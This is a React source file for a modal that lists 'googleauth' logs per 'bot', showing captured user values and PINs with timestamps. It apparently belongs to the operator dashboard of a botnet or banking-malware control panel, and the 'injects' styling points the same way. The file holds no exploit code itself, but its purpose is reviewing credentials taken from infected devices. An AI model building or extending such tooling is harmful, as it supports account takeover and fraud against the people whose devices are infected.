import React, {useEffect} from "react";
import {BotModalProps} from "../../../Model/Modal";
import {Button, Modal, Space, Table} from "antd";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";
import {BotLog} from "../../../Model/BotLog";
import {RedoOutlined} from "@ant-design/icons";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

const GoogleAuth: React.FC<BotModalProps> = (props: BotModalProps) => {
    const closeModal = () => {
        props.setVisible(false);
    };

    const {t} = useTranslation();

    const logsReducer = useAppSelector((state: AppState) => state.logs);

    const dispatch = useAppDispatch();

    useEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("googleauth", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
        }
    }, [dispatch, props.bot.id, props.visible]);

    const columns = [
        {
            title: "# ID",
            dataIndex: "id",
            key: "id",
            width: 56,
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>ID</h3>
                    </div>
                    <div className="table-col-item" style={{textAlign: "center"}}>
                        {text}
                    </div>
                </div>,
        },
        {
            title: t("user"),
            dataIndex: "user",
            key: "user",
            render: (text: string, log: BotLog) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("DATA")}</h3>
                        </div>
                        <div className="table-col-item">
                            <div className="code">{(log.log.user_0 as string)}</div>
                        </div>
                    </div>
                );
            },
        },
        {
            title: t("pin"),
            dataIndex: "pin",
            key: "pin",
            render: (text: string, log: BotLog) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("DATA")}</h3>
                        </div>
                        <div className="table-col-item">
                            <div className="code">{(log.log.pin_0 as string)}</div>
                        </div>
                    </div>
                );
            },
        },
        {
            title: t("CREATED_AT"),
            dataIndex: "created_at",
            key: "created_at",
            width: 200,
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("CREATED_AT")}</h3>
                    </div>
                    <div className="table-col-item" style={{textAlign: "center"}}>
                        {text}
                    </div>
                </div>,
        },
    ];

    const refreshGoogleAuth = () => {
        dispatch(getLogsList("googleauth", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
    };

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "googleauth" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title={t("googleauth")}
            open={props.visible}
            onCancel={closeModal}
            className="modal-injects"
            destroyOnClose
            footer={(
                <>
                    <Button type="primary" onClick={refreshGoogleAuth} icon={<RedoOutlined />}>
                        {t("REFRESH")}
                    </Button>

                    <Button type="primary" onClick={closeModal}>
                        {t("CLOSE")}
                    </Button>
                </>
            )}
            centered
            width={600}
        >
            <div className="table-scroll" style={{maxHeight: 300, overflowY: "auto"}}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? logsReducer.logs : []}
                    size="small"
                    pagination={false}
                    loading={!isLoaded}
                    locale={{
                        emptyText: (
                            <Space>
                                <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                            </Space>
                        ),
                    }}
                />
            </div>
        </Modal>
    );
};

export default GoogleAuth;
